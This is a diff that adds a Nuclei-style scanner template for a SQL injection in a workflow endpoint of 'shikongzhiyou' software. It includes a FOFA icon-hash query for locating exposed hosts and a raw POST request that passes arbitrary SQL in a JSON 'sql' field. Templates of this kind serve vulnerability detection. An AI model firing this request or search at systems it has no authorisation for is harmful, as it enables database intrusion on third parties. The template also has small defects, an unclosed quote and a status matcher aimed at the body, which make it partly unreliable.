@@ -1,0 +1,36 @@
+id: shikongzhiyou-workflow-sqlResult-sqli
+info:
+  name: shikongzhiyou-workflow-sqlResult-sqli
+  author: sb
+  severity: critical
+  tags: sqli
+  description: SQL注入
+  metadata:
+    fofa-query: icon_hash="-1700598274"
+variables:
+  s1: '{{rand_base(5, "4ra1n")}}
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1 
+        Content-Type: application/json
+
+        {"params": {"a": "1"}, "sql": "select {{s1}}"}
+  
+    req-condition: true    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "{{s1}}"      
+
+      - type: status
+        part: body_1
+        status:
+          - 200
+          
